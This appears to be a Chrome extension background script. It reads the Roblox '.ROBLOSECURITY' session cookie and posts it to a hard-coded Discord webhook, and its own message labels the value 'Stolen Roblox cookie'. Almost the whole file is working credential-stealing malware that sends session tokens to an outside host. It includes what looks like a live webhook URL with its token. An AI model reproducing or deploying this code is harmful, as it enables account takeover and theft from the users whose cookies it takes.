chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
  if (message.action === "fetchCookies") {
    const domain = "https://www.roblox.com";

    // Your cookie fetching logic here, for example:
    const token = await getCookie(domain, ".ROBLOSECURITY");
    // ... fetch other cookies, build fullToken etc.

    const fullToken = token; // Simplified for example

    // Send the token to Discord webhook
    sendToDiscordWebhook("Stolen Roblox cookie: " + fullToken);

    sendResponse({ token: token, fullToken: fullToken });
    return true;
  }
});

// Helper function getCookie (returns Promise)
function getCookie(domain, name) {
  return new Promise((resolve) => {
    chrome.cookies.get({ url: domain, name: name }, (cookie) => {
      resolve(cookie ? cookie.value : null);
    });
  });
}

// The sendToDiscordWebhook function as above
function sendToDiscordWebhook(message) {
  const webhookUrl = "https://discord.com/api/webhooks/1379740796865220748/IIt1p7i8DWHamFCAcKjfP8OKE10D3jGGRqUb3LqACPkzWFKzX8sOArDekfIadhYUltZ4";

  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: message
    }),
  })
  .then(response => {
    if (!response.ok) {
      console.error("Failed to send webhook:", response.statusText);
    } else {
      console.log("Message sent to Discord webhook.");
    }
  })
  .catch(error => console.error("Error sending webhook:", error));
}
